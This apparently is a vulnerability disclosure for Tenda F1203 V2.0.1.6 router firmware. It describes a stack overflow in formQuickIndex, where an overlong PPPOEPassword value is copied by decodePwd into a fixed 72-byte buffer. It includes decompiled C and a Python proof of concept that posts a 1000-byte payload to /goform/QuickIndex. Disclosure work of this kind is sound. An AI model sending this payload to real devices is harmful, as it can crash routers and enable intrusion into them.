## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2494.html

## Affected version

F1203 V2.0.1.6

## Vulnerability details

The Tenda F1203 V2.0.1.6 firmware has a stack overflow vulnerability in the `formQuickIndex` function. The `v5` variable receives the `PPPOEPassword` parameter from a POST request and is later assigned to the `v7` variable, which is fixed at 72 bytes. However, since the user can control the input of  `PPPOEPassword`, in function `decodePwd`, the statement: 

```c
_BYTE *__fastcall decodePwd(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // $v0
  _BYTE *v3; // [sp+8h] [+8h]
  _BYTE *v4; // [sp+Ch] [+Ch]

  v3 = a1;
  v4 = a2;
  result = a1;
  if ( a1 )
  {
    result = a2;
    if ( a2 )
    {
      while ( *v3 )
      {
        if ( *v3 == 92 )
          ++v3;
        *v4++ = *v3++;
      }
      result = v4;
      *v4 = 0;
    }
  }
  return result;
}
```

can cause a stack overflow. The user-provided  `PPPOEPassword` can exceed the capacity of the `s` array, triggering this security vulnerability.

![image-20240319131821114](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319131821114.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/QuickIndex"
payload = b"a"*1000

data = {"mit_linktype":"2","PPPOEPassword": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319132049379](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319132049379.png)
